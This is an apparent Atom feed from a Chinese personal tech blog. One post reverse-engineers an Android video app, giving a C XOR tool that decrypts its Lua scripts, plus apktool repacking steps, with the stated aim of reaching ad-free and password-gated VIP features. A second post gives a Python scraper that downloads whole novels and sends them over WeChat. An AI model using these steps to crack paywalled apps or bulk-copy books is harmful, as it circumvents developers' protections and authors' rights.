<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>苏乞儿</title>
  
  <subtitle>人生一世，草木一秋</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.suqir.xyz/"/>
  <updated>2020-03-16T10:35:35.838Z</updated>
  <id>https://blog.suqir.xyz/</id>
  
  <author>
    <name>苏乞儿</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>对某视频解析软件的逆向分析</title>
    <link href="https://blog.suqir.xyz/2020/03/07/%E5%AF%B9%E6%9F%90%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E8%BD%AF%E4%BB%B6%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>https://blog.suqir.xyz/2020/03/07/%E5%AF%B9%E6%9F%90%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E8%BD%AF%E4%BB%B6%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2020-03-07T09:23:07.000Z</published>
    <updated>2020-03-16T10:35:35.838Z</updated>
    
    <content type="html"><![CDATA[<p>该app使用了Lua脚本并进行了加密，借此机会实践一下Lua脚本解密</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近偶然发现一款全网视频解析的软件，安装后发现首页有影响使用体验的广告存在（<strong>现在作者已取消广告</strong>），同时其附加功能需要加群获取密码才能使用。借这个机会尝试通过逆向工程分析其逻辑，同时这个App使用了Lua脚本并进行了加密，也借此机会实践一下Lua脚本的解密</p><ul><li><p>软件的原始版本下载：<a href="http://t.cn/A67dqdcS" target="_blank" rel="noopener">原始版本</a></p></li><li><p>软件截图</p></li></ul><table><thead><tr><th style="text-align:center">首页</th><th style="text-align:center">VIP功能</th><th style="text-align:center">VIP功能</th></tr></thead><tbody><tr><td style="text-align:center"><img src="/2020/03/07/对某视频解析软件的逆向分析/main.jpg" alt="首页" style="zoom: 25%;"></td><td style="text-align:center"><img src="/2020/03/07/对某视频解析软件的逆向分析/vip1.jpg" alt="vip功能" style="zoom: 25%;"></td><td style="text-align:center"><img src="/2020/03/07/对某视频解析软件的逆向分析/vip2.jpg" alt="vip功能" style="zoom: 25%;"></td></tr></tbody></table><h1 id="0x01-工具"><a href="#0x01-工具" class="headerlink" title="0x01 工具"></a>0x01 工具</h1><ul><li><p><a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="noopener">apktool</a>—可以将apk资源解码，并在修改后可以重新构建它们，它还可以执行一些自动化任务，例如构建apk</p></li><li><p><a href="https://www.lanzous.com/iabhd3e" target="_blank" rel="noopener">unluac.jar</a>—是一个lua脚本反编译工具，适用于反编译lua开发的程序源码</p></li></ul><h1 id="0x02-分析过程"><a href="#0x02-分析过程" class="headerlink" title="0x02 分析过程"></a>0x02 分析过程</h1><ul><li><h2 id="使用Apktool对其进行解包，解包到App目录下"><a href="#使用Apktool对其进行解包，解包到App目录下" class="headerlink" title="使用Apktool对其进行解包，解包到App目录下"></a>使用Apktool对其进行解包，解包到App目录下</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool.bat d VIP终结者_5.2.2.apk -o App</span><br></pre></td></tr></table></figure><p>执行完毕后进入App目录下</p><p><img src="/2020/03/07/对某视频解析软件的逆向分析/app_dir.png" alt="app_dir"></p><p>其中：</p><ul><li><p><strong>assets</strong>：存放资源文件，包含<em>Lua</em>脚本</p></li><li><p><strong>lib</strong>：本地库(Native Library)文件夹，包含编译后的本地代码(Native Code)的<em>so</em>文件</p></li><li><p><strong>smail</strong>：存放<code>smail</code>文件，包含<code>Dalvik</code>字节码，是对App的Java代码反编译成字节码的结果</p></li><li><p><strong>AndroidManifest.xml</strong>：包含App的信息</p></li></ul></li></ul><ul><li><h2 id="分析smail"><a href="#分析smail" class="headerlink" title="分析smail"></a>分析smail</h2><p>进入smail文件夹可以看到Java代码的结构：</p><p><img src="/2020/03/07/对某视频解析软件的逆向分析/smail_com.png" alt="samil_com"></p><p>发现存在<code>com.androlua</code>、<code>com.luajava</code>等包名，经搜索相关项目，判断App的大部分代码均来自<a href="https://github.com/nirenr/AndroLua_pro" target="_blank" rel="noopener">AndroLua_pro</a>。而AndroLua_pro是一个使用Lua语言编写的Android应用的项目，所以，Java代码极有可能并不是应用的主体部分，重要操作很有可能会写在Lua中，所以下面重点分析Lua脚本部分。</p></li></ul><ul><li><h2 id="初步分析Lua"><a href="#初步分析Lua" class="headerlink" title="初步分析Lua"></a>初步分析Lua</h2><p>进入assets可以看到里面存放了所有的Lua脚本及App的图片资源：</p><p><img src="/2020/03/07/对某视频解析软件的逆向分析/assets.png" alt="assets"></p><p>用winhex打开lua脚本:</p><p><img src="/2020/03/07/对某视频解析软件的逆向分析/lua_encrypt.png" alt="lua_encrypt"></p><p>发现并不是Lua明文代码，也不是编译后的<code>luac</code>文件。由此得知Lua脚本被加密了，需要对其进行解密</p></li></ul><ul><li><h2 id="解密Lua"><a href="#解密Lua" class="headerlink" title="解密Lua"></a>解密Lua</h2><p>AndroLua_Pro所使用的Lua工具<code>LuaJava</code>会加载依赖库<code>libluajava.so</code>，<code>LuaJava</code>会使用<code>luaL_loadbuffer</code>或者<code>luaL_loadbufferx</code>函数对Lua脚本进行加载，这个函数也是加入Lua脚本解密代码的常见位置，所以找到<code>lib/armeabi/libluajava.so</code>，用IDA打开并找到这个函数，按<code>F5</code>进行进一步分析：</p><p><img src="/2020/03/07/对某视频解析软件的逆向分析/so_f5.png" alt="so_f5"></p><p>（上图为方便阅读，已反混淆变量名）</p><p>与AndroLua_Pro的<a href="https://github.com/nirenr/AndroLua_pro/blob/f996270a1a01a4e41836c108d11df08803d6eb59/app/src/main/jni/lua/lauxlib.c#L770-L776" target="_blank" rel="noopener">原始代码</a>比较，可以发现加入了Lua脚本解密的代码，分析该代码发现有一个IDA无法识别的函数<code>sub_265E0(t, 255)</code>，由于对IDA工具还有很多不懂的地方，故没有深入研究，初步猜测是t对255的取余运算（后面验证确实如此）。我们可以参考这一代码，使用C语言编写一个简单的解密工具：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">decrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buff, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *buff1 = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) <span class="built_in">malloc</span>(size);</span><br><span class="line">buff1[<span class="number">0</span>] = <span class="number">27</span>;</span><br><span class="line"><span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; size; i++) &#123;</span><br><span class="line">t += size;</span><br><span class="line">buff1[i] = buff[i] ^ (t % <span class="number">255</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> buff1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buff[<span class="number">204800</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"> <span class="keyword">char</span> filename[<span class="number">20</span>] = <span class="string">"main.lua"</span>;</span><br><span class="line"> <span class="keyword">if</span> (argc == <span class="number">2</span>)</span><br><span class="line">  <span class="built_in">strcpy</span>(filename,argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"File name: %s \n"</span>, filename);</span><br><span class="line"></span><br><span class="line">FILE *fp = fopen(filename, <span class="string">"rb"</span>);</span><br><span class="line"><span class="keyword">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">size = fread(buff, <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span>), <span class="number">204800</span>, fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"File size: %ld \n"</span>, size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *res = decrypt(buff, size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcat</span>(filename, <span class="string">"c"</span>);</span><br><span class="line">FILE *fp1 = fopen(filename, <span class="string">"wb"</span>);</span><br><span class="line">fwrite(res, <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span>), size, fp1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Output: %s"</span>, filename);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这一代码为<code>decrypt.exe</code>，并拷贝到<code>assets</code>文件夹下，执行以下命令来解密<code>config.lua</code>脚本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decrypt.exe config.lua</span><br></pre></td></tr></table></figure><p><img src="/2020/03/07/对某视频解析软件的逆向分析/cmd_decrypt.png" alt="cmd_decrypt"></p></li></ul><p>  解密后的文件为<code>config.luac</code>，使用文本编辑器观察可以发现其仍然不是Lua代码，而是编译后的luac文件，我们还需要使用<code>unluac.jar</code>对其进行反编译。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar unluac.jar --rawstring config.luac &gt; config_new.lua</span><br></pre></td></tr></table></figure><p>  <img src="/2020/03/07/对某视频解析软件的逆向分析/cmd_luac2lua.png" alt="cmd_luac2lua"></p><p>  (如果原始的源码中含有中文，需使用<code>--rawstring</code>参数进行解码)</p><p>  反编译后的<code>config.lua</code>脚本内容如下：</p><p>  <img src="/2020/03/07/对某视频解析软件的逆向分析/config.png" alt="config"></p><p>  对Lua脚本的修改不是本文探讨的重点，故不做分析。</p><p>  使用如下命令进行打包：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool b App –o out/newApp.apk</span><br></pre></td></tr></table></figure><p>  打包后的apk文件没有签名是不能安装到手机上的，需要使用其他的签名工具来对apk签名如<code>signapk.jar</code>、<code>auto-sign</code>等</p><h1 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h1><p>本文分析了在Android中Lua脚本的解密过程，可以看到，软件的开发和逆向分析虽然看似处于对立的层面，但是双方的博弈过程却又促进着各自的发展，这使得开发人员更加重视软件的安全性，逆向工程师们也与时俱进的学习新的知识来面对越来越复杂的安全工作。随着国家现在越来越重视互联网安全问题，很多法律法规的出台来约束互联网规范，我们更应该重视安全对于各行各业的影响和机遇。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;该app使用了Lua脚本并进行了加密，借此机会实践一下Lua脚本解密&lt;/p&gt;
    
    </summary>
    
    
      <category term="逆向分析" scheme="https://blog.suqir.xyz/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Android" scheme="https://blog.suqir.xyz/tags/Android/"/>
    
      <category term="逆向" scheme="https://blog.suqir.xyz/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="lua" scheme="https://blog.suqir.xyz/tags/lua/"/>
    
  </entry>
  
  <entry>
    <title>爬取某书网指定小说-微信版</title>
    <link href="https://blog.suqir.xyz/2018/12/15/%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4-%E5%BE%AE%E4%BF%A1%E7%89%88/"/>
    <id>https://blog.suqir.xyz/2018/12/15/%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4-%E5%BE%AE%E4%BF%A1%E7%89%88/</id>
    <published>2018-12-15T10:46:39.000Z</published>
    <updated>2020-03-17T14:17:45.749Z</updated>
    
    <content type="html"><![CDATA[<p>服务器版的小说爬虫，并借助python的itchat库实现微信对话式小说下载服务<br><a id="more"></a></p><h1 id="0x00-实现功能"><a href="#0x00-实现功能" class="headerlink" title="0x00 实现功能"></a>0x00 实现功能</h1><p>微信端发送小说名到指定微信号（格式：小说名suqir作者），服务器开始在全书网(<code>http://www.quanshuwang.com</code>)爬取该小说，爬取完成后将询问是否下载，确认后将通过微信以文件的形式发送</p><h1 id="0x01-源代码"><a href="#0x01-源代码" class="headerlink" title="0x01 源代码"></a>0x01 源代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"><span class="keyword">from</span> itchat.content <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookSpyder</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""爬取指定小说-server版"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, book_name,book_author)</span>:</span></span><br><span class="line">        super(BookSpyder, self).__init__()</span><br><span class="line">        self.book_author = book_author</span><br><span class="line">        self.headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span>&#125;</span><br><span class="line">        self.url = <span class="string">'http://www.quanshuwang.com/modules/article/search.php?searchkey='</span>+urllib.request.quote(book_name.encode(<span class="string">'gb2312'</span>))+<span class="string">'&amp;searchtype=articlename&amp;searchbuttom.x=88&amp;searchbuttom.y=22'</span></span><br><span class="line">        search_data = requests.get(self.url,headers=self.headers,allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 搜索结果唯一时</span></span><br><span class="line">            self.location = search_data.headers[<span class="string">'location'</span>].split()</span><br><span class="line">            self.location2res(self.location[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            self.location = re.findall(<span class="string">r'&lt;li&gt;&lt;a target="_blank" href="(.*?)".*?title="(.*?)".*&gt;(.*?)&lt;/a&gt;&lt;em class=.*?&gt;(.*?)&lt;a href='</span>,search_data.content.decode(<span class="string">'gbk'</span>))</span><br><span class="line">            <span class="keyword">for</span> http <span class="keyword">in</span> self.location:</span><br><span class="line">                flag = self.location2res(http[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#link</span></span><br><span class="line">        self.booklink = re.findall(<span class="string">r'class="leftso png_bg"&gt;&lt;a href="(.*?)"'</span>,self.res)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">#正则匹配书名</span></span><br><span class="line">        self.book_name = re.findall(<span class="string">r'&lt;meta property="og:title" content="(.*?)"/&gt;'</span>,self.res)[<span class="number">0</span>]</span><br><span class="line">        response = requests.get(self.booklink,headers=self.headers).content.decode(<span class="string">'gbk'</span>)</span><br><span class="line">        <span class="comment">#正则匹配所有章节及其链接</span></span><br><span class="line">        self.contents = re.findall(<span class="string">r'&lt;li&gt;&lt;a href="(.*?)" title="(.*?)"&gt;.*?&lt;/a&gt;&lt;/li&gt;'</span>,response)</span><br><span class="line">        <span class="comment">#总章数</span></span><br><span class="line">        self.len = len(self.contents)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">location2res</span><span class="params">(self,location)</span>:</span></span><br><span class="line">        flag = <span class="number">-1</span></span><br><span class="line">        self.res = requests.get(location,headers=self.headers).content.decode(<span class="string">'gbk'</span>)</span><br><span class="line">        author = re.findall(<span class="string">r'&lt;meta property="og:novel:author" content="(.*?)"'</span>,self.res)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> self.book_author == author:</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.description = re.findall(<span class="string">r'介绍:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;/div&gt;'</span>,self.res,re.S)[<span class="number">0</span>].replace(<span class="string">'&amp;nbsp;'</span>,<span class="string">''</span>).replace(<span class="string">'&lt;br /&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">except</span> IndexError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self)</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="comment">#开始写入文件</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'./book/suqir.txt'</span>,<span class="string">'w'</span>,encoding=<span class="string">'utf-8'</span>,errors=<span class="string">'ignore'</span>) <span class="keyword">as</span> text_save:</span><br><span class="line">            text_save.write(self.book_name+<span class="string">'\n作者：'</span>+self.book_author)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'self.description'</span> <span class="keyword">in</span> dir():</span><br><span class="line">                text_save.write(<span class="string">'\n简介：'</span>+self.description)</span><br><span class="line">            text_save.write(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">for</span> num <span class="keyword">in</span> self.contents:</span><br><span class="line">                <span class="comment">#获取单章文本</span></span><br><span class="line">                text_r = requests.get(num[<span class="number">0</span>],headers=self.headers)</span><br><span class="line">                text_c = text_r.content</span><br><span class="line">                text = text_c.decode(<span class="string">'gb18030'</span>)</span><br><span class="line">                <span class="comment">#获取章节名</span></span><br><span class="line">                title = num[<span class="number">1</span>].replace(re.findall(<span class="string">r'，共\d*字'</span>,num[<span class="number">1</span>])[<span class="number">0</span>],<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment">#正则匹配内容</span></span><br><span class="line">                    text = re.findall(<span class="string">r'&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script type="text/javascript"&gt;'</span>,text,re.S)[<span class="number">0</span>]</span><br><span class="line">                    <span class="comment">#数据清洗</span></span><br><span class="line">                    text = text.replace(<span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>,<span class="string">''</span>)</span><br><span class="line">                    text = text.replace(<span class="string">'&lt;br /&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">                    text = text.replace(<span class="string">'\r\n\r\n'</span>,<span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">                    text_save.write(<span class="string">'\n'</span>)</span><br><span class="line">                    text_save.write(title)</span><br><span class="line">                    text_save.write(<span class="string">'\n\n'</span>)</span><br><span class="line">                    text_save.write(text)</span><br><span class="line">                    text_save.write(<span class="string">'\n'</span>)</span><br><span class="line">                    print(<span class="string">'[*]%-30s\t完成度%.3f%%'</span>%(title,(i+<span class="number">1</span>) * <span class="number">100</span> / self.len))</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">                    print(<span class="string">'【*】%s下载失败'</span>%title)</span><br><span class="line">            text_save.write(<span class="string">'\n===全书完===\n==by苏乞儿==\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bookname</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.book_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bookauthor</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.book_author</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_des</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.description</span><br><span class="line">        <span class="keyword">except</span> AttributeError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'无简介'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_centents</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.len</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_booklink</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.booklink</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUserName</span><span class="params">()</span>:</span></span><br><span class="line">    itchat.auto_login(hotReload=<span class="keyword">True</span>,enableCmdQR=<span class="number">2</span>)</span><br><span class="line">    onlyUser = itchat.search_friends(name=<span class="string">'杰帅'</span>)</span><br><span class="line">    <span class="keyword">return</span> onlyUser[<span class="number">0</span>][<span class="string">'UserName'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@itchat.msg_register([TEXT],isFriendChat=True)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text_reply</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> userName</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="string">'FromUserName'</span>] == userName:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            bookName,bookAuthor = msg[<span class="string">'Text'</span>].split(<span class="string">'suqir'</span>)</span><br><span class="line">            book = BookSpyder(bookName,bookAuthor)</span><br><span class="line">            itchat.send(<span class="string">'书名：%s\n作者：%s\n简介：%s'</span> % (bookName,bookAuthor,book.get_des()),toUserName=userName)</span><br><span class="line">            itchat.send(<span class="string">'正在爬取《%s》...'</span> % bookName,toUserName=userName)</span><br><span class="line">            print(<span class="string">'[*]正在爬取《%s》...'</span> % bookName)</span><br><span class="line">            book.save()</span><br><span class="line">            itchat.send(<span class="string">'爬取完毕！是否下载？(是/否)'</span>,toUserName=userName)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">if</span> msg[<span class="string">'Text'</span>] == <span class="string">'是'</span>:</span><br><span class="line">                print(<span class="string">'[*]正在发送文件...'</span>)</span><br><span class="line">                itchat.send(<span class="string">'正在上传...'</span>,toUserName=userName)</span><br><span class="line">                itchat.send_file(<span class="string">'./book/suqir.txt'</span>,toUserName=userName)</span><br><span class="line">                print(<span class="string">'[*]已发送文件！\n等待下次请求...'</span>)</span><br><span class="line">                itchat.send(<span class="string">'感谢使用！'</span>,toUserName=userName)</span><br><span class="line">            <span class="keyword">elif</span> msg[<span class="string">'Text'</span>] == <span class="string">'否'</span>:</span><br><span class="line">                itchat.send(<span class="string">'已取消，感谢使用！'</span>,toUserName=userName)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'[*]Starting...'</span>)</span><br><span class="line">    userName = getUserName()</span><br><span class="line">    itchat.run()</span><br></pre></td></tr></table></figure><h1 id="0x02-运行部分截图"><a href="#0x02-运行部分截图" class="headerlink" title="0x02 运行部分截图"></a>0x02 运行部分截图</h1><h2 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h2><p><img src="/2018/12/15/爬取某书网指定小说-微信版/server.jpg" alt="服务器"></p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p><img src="/2018/12/15/爬取某书网指定小说-微信版/vx.jpg" alt="微信"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;服务器版的小说爬虫，并借助python的itchat库实现微信对话式小说下载服务&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://blog.suqir.xyz/categories/Python/"/>
    
    
      <category term="python, itchat,&quot;爬虫&quot;" scheme="https://blog.suqir.xyz/tags/python-itchat-%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>利用微信实现小说更新提醒</title>
    <link href="https://blog.suqir.xyz/2018/11/26/%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%AE%9E%E7%8E%B0%E5%B0%8F%E8%AF%B4%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92/"/>
    <id>https://blog.suqir.xyz/2018/11/26/%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%AE%9E%E7%8E%B0%E5%B0%8F%E8%AF%B4%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92/</id>
    <published>2018-11-26T11:13:52.000Z</published>
    <updated>2020-03-17T14:15:35.931Z</updated>
    
